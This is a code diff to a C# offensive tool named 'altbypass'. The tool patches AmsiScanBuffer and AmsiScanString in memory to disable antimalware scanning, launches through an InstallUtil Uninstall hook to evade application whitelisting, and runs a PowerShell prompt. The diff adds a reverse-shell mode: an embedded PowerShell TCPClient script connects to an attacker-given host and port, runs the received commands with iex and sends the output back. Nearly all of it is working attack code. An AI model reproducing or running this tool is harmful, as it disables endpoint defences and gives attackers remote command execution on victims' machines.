@@ -8,17 +8,19 @@ using System.Runtime.InteropServices;
 using System.Runtime.CompilerServices;
 using System.Linq;
 using System.Collections.Generic;
+using System.Configuration.Install;
 
 namespace altbypass
 {
     class altbypass
     {
+        static string revClose = "RevClient Closed :(";
         [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
         [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
         [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
         [DllImport("kernel32.dll", SetLastError = true)] static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
         [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GetCurrentProcess();
-        
+
         // Dynamically search for and patch AmsiScanBuffer and AmsiScanString
         static int Bypass()
         {
@@ -95,12 +97,16 @@ namespace altbypass
                 ps.AddCommand("Out-String");
                 results = ps.Invoke();
                 StringBuilder stringBuilder = buildOutput(results);
+                string str_results = stringBuilder.ToString().Trim();
 
                 // if $Error holds a value
-                if (!String.Equals(stringBuilder.ToString().Trim(), ""))
+                if (!String.Equals(str_results, ""))
                 {
-                    Console.WriteLine(stringBuilder.ToString().Trim());
-
+                    if (str_results.Contains("No connection could be made because the target machine"))
+                    {
+                        throw new Exception(revClose);
+                    }
+                    Console.WriteLine(str_results);
                     //clear error var
                     ps.Commands.Clear();
                     ps.AddScript("$error.Clear()");
@@ -110,6 +116,10 @@ namespace altbypass
             }
             catch (Exception e)
             {
+                if (e.Message.Equals(revClose))
+                {
+                    throw new Exception(revClose);
+                }
                 Console.WriteLine(e.ToString());
             }
             ps.Commands.Clear();
@@ -127,8 +137,18 @@ namespace altbypass
             return stringBuilder;
         }
 
-        public static void Main()
+        public static void Main(string[] args)
         {
+            string rhost = "", port = "";
+            // checking for RevShell mode
+            bool revShell = false;
+            if (args != null && args.Length > 0 && !string.IsNullOrEmpty(args[0]) && !string.IsNullOrEmpty(args[1]))
+            {
+                revShell = true;
+                rhost = args[0];
+                port = args[1];
+            }
+
             Bypass();
 
             Char a1, a2, a3, a4, a5;
@@ -149,7 +169,40 @@ namespace altbypass
             VirtualProtect(get_l_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);
             var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
             Marshal.Copy(new_instr, 0, get_l_ptr, 4);
+
+
+            string revShellcommand = @"$client = New-Object System.Net.Sockets.TCPClient('{RHOST}',{PORT});
+                                    $stream = $client.GetStream();
+                                    [byte[]]$bytes = 0..65535|%{0};
+                                    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+                                    {
+	                                    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+                                        if( $data -like '*exit*' ){
+                                            throw '" + revClose + @"';
+                                        }
+	                                    try
+	                                    {	
+		                                    $sendback = (iex $data 2>&1 | Out-String );
+		                                    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
+	                                    }
+	                                    catch
+	                                    {
+		                                    $error[0].ToString() + $error[0].InvocationInfo.PositionMessage;
+		                                    $sendback2  =  ""ERROR: "" + $error[0].ToString() + ""`n`n"" + ""PS "" + (pwd).Path + '> ';
+	                                    }	
+	                                    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+	                                    $stream.Write($sendbyte,0,$sendbyte.Length);
+	                                    $stream.Flush();
+                                    };
+                                    $client.Close();";
             string cmd;
+            // funny intro
+            if (!revShell)
+                Console.WriteLine("Type your P0w3rSh3ll command down here \n");
+            else
+            {
+                revShellcommand = revShellcommand.Replace("{RHOST}", rhost).Replace("{PORT}", port);
+            }
 
             //set a large readline input buffer
             const int BufferSize = 3000;
@@ -163,25 +216,65 @@ namespace altbypass
 
             while (true)
             {
-                Console.Write("PS " + Directory.GetCurrentDirectory() + ">");
-                cmd = Console.ReadLine();
+                if (!revShell)
+                {
+                    Console.Write("PS " + Directory.GetCurrentDirectory() + ">");
+                    cmd = Console.ReadLine();
+                }
+                else
+                {
+                    cmd = revShellcommand;
+                }
 
                 if (String.Equals(cmd, "exit"))
                     break;
-                runCommand(ps, cmd);
+                // vervbse check!
+                if (!string.IsNullOrEmpty(cmd))
+                {
+                    try
+                    {
+                        runCommand(ps, cmd);
+                    }
+                    // will get an exception when revshell client sends exit
+                    catch (Exception ex)
+                    {
+                        if (revShell && ex.ToString().Contains(revClose))
+                        {
+                            revShellcommand = "exit";
+                        }
+
+                        Console.WriteLine("{0}", ex.Message);
+                    }
+                }
             }
             rs.Close();
         }
     }
-    
+
     // InstallUtill uninstall bypass
     [System.ComponentModel.RunInstaller(true)]
     public class Loader : System.Configuration.Install.Installer
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            base.Uninstall(savedState);
-            altbypass.Main();
+            string rhost = "", port = "";
+            string revshell = this.Context.Parameters["revshell"];
+            if (!string.IsNullOrEmpty(revshell))
+            {
+                rhost = this.Context.Parameters["rhost"];
+                if (rhost == null)
+                {
+                    throw new InstallException("Mandatory parameter 'rhost' for revshell mode");
+                }
+
+                port = this.Context.Parameters["rport"];
+                if (port == null)
+                {
+                    throw new InstallException("Mandatory parameter 'port' for revshell mode");
+                }
+            }
+            string[] args = new string[] { rhost, port };
+            altbypass.Main(args);
         }
     }
 }
